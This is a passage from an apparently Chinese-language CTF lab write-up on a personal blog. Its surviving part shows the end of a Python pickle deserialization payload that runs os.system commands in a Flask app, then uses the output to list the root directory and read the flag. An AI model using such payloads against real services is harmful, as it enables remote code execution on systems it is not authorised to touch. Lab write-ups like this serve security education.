(os.system,(&#x27;ls&#x27;,))#错误写法，因为这里已经导入了os，靶场又没</span></span><br><span class="line">a = payload()</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(pickle.dumps(a)))</span><br></pre></td></tr></table></figure>
<p>这边根据flask框架，很容易知道目录是&#x2F;app&#x2F;static，我们先把根目录有啥都导出来：（在&#x2F;static&#x2F;6.txt获得）<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668104777891-172496b2-f4d0-44df-a16d-be30946117b8.png#averageHue=%23353e47&clientId=ud3ef7058-52a8-4&from=paste&height=323&id=u402d61b1&name=image.png&originHeight=404&originWidth=402&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13970&status=done&style=none&taskId=ub66d1785-6fad-4332-83be-57c09b9f974&title=&width=321.6" alt="image.png"><br>看到了flag<code>__flag__xoxv</code>：<br>改一下payload之后：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668104793820-5abf9c83-7710-4188-a633-a0e8b8f5febb.png#averageHue=%2349515a&clientId=ud3ef7058-52a8-4&from=paste&height=54&id=u5e4c6f30&name=image.png&originHeight=68&originWidth=529&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5348&status=done&style=none&taskId=u68f0aad4-9204-4e08-bdf2-cfcc3b884a4&title=&width=423.2" alt="image.png"></p>
<h1 id="——结语———"><a href="#——结语———" class="headerlink" title="——结语———"></a>——结语———</h1><p><strong>这对我来说无疑是一次颇有兴趣的尝试，比起之前的一些靶场，这个更加偏向于我们对内网的理解，同时也考了很多web的知识，希望今后可以更加熟练</strong></p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/CTF/" class="tag">#CTF</a><a href="/tags/内网穿透/" class="tag">#内网穿透</a><a href="/tags/内网/" class="tag">#内网</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/03/02/%E4%B8%8D%E8%A6%81%E6%8D%89%E5%BC%84%E6%88%91%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6%EF%BC%9AA/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">不要捉弄我新人同学: A</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/03/02/Node.Js%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">Node.Js安全分析</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2025 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>